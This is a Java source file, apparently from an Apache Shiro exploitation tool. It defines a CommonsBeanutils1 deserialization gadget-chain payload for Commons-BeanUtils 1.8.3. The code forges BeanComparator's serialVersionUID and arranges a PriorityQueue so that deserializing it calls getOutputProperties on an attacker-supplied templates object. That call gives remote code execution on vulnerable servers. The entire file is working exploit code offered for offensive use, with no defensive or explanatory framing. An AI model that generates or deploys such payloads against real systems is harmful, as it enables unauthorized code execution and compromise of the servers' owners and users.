package com.sma11new.exp.shiro.attack.payloads;

import cn.hutool.core.util.RandomUtil;
import com.sma11new.exp.shiro.attack.util.JavassistClassLoader;
import com.sma11new.exp.shiro.attack.util.Reflections;
import javassist.*;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils1_183
implements ObjectPayload {
    public Object getObject(Object templates) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        } catch (NotFoundException ctSUID) {
            // empty catch block
        }
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "property", "lowestSetBit");
        PriorityQueue<BigInteger> queue = new PriorityQueue<BigInteger>(2, beanComparator);
        String baseString = "123456789";
        String pass = RandomUtil.randomString(baseString, 1);
        queue.add(new BigInteger(pass));
        queue.add(new BigInteger(pass));
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;
        return queue;
    }

    public static void main(String[] args) throws Exception {
        CommonsBeanutils1_183 payload = new CommonsBeanutils1_183();
        payload.getObject(new Object());
    }
}

